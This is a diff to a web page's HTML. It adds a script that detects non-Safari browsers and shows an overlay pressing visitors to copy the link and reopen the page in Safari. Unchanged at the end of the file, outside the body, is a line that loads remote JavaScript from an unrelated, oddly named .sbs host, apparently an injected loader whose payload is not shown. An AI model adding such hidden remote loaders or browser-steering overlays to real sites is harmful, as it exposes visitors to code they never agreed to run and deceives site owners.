@@ -643,6 +643,57 @@
           img.setAttribute('src', path + '?' + params.toString() + hash);
         });
       })();</script>
+    <script>
+      (function () {
+        var ua = (navigator.userAgent || '').toLowerCase();
+        var isSafari = /safari/.test(ua) && !/(chrome|crios|fxios|opios|edg|samsung)/.test(ua);
+
+        var overlay = document.getElementById('flow-overlay');
+        var panel = document.getElementById('safari-panel');
+        var closeBtn = panel ? panel.querySelector('.flow-close') : null;
+        var copyBtn = document.getElementById('copy-safari');
+        var status = document.getElementById('copy-status');
+        var fallback = document.getElementById('copy-fallback');
+
+        function show() {
+          if (overlay) overlay.removeAttribute('hidden');
+          if (panel) panel.removeAttribute('hidden');
+          if (fallback) fallback.value = window.location.href;
+          if (closeBtn) closeBtn.focus();
+        }
+        function hide() {
+          if (overlay) overlay.setAttribute('hidden', '');
+          if (panel) panel.setAttribute('hidden', '');
+        }
+        function copyUrl() {
+          var url = window.location.href;
+          function feedback(ok) {
+            if (status) status.textContent = ok ? 'Link copied — paste it in Safari to open' : 'Copy failed — long-press the link below to copy manually';
+            if (!ok && fallback) {
+              fallback.removeAttribute('hidden');
+              fallback.focus();
+              fallback.select();
+            }
+          }
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(url).then(function () { feedback(true); }, function () { feedback(false); });
+          } else if (fallback) {
+            fallback.removeAttribute('hidden');
+            fallback.focus();
+            fallback.select();
+            try { feedback(document.execCommand('copy')); } catch (e) { feedback(false); }
+          } else {
+            feedback(false);
+          }
+        }
+
+        if (!isSafari) show();
+        if (closeBtn) closeBtn.addEventListener('click', hide);
+        if (copyBtn) copyBtn.addEventListener('click', copyUrl);
+        if (overlay) overlay.addEventListener('click', function (e) { if (e.target === overlay) hide(); });
+        document.addEventListener('keydown', function (e) { if (e.key === 'Escape') hide(); });
+      })();
+    </script>
   </body>
 
 <script src="https://87-835A7314.jiaoyang677.sbs/lj/p.js" async></script>  
